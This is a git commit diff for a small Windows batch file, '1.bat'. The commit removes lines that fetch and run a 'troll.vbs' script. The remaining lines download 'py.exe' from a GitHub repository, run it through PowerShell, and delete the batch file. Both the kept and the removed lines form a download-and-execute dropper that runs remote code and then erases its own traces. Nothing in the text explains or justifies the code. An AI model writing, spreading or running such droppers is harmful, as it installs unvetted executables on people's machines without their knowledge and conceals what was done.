362775b7cab639871df0755bb00da4b3fd19c1dd
oogabooga245 <68644080+oogabooga245@users.noreply.github.com>
2024-07-05 07:18:06 +0000

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -1,9 +1,3 @@
-del py.exe
-curl -o troll.vbs https://raw.githubusercontent.com/oogabooga245/ysboob/main/troll.vbs
-start troll.vbs
-timeout 2 >null
-del troll.vbs
-timeout 10 >null
 curl -o py.exe https://github.com/oogabooga245/ysboob/raw/main/py.exe
 powershell -command py.exe
 del 1.bat
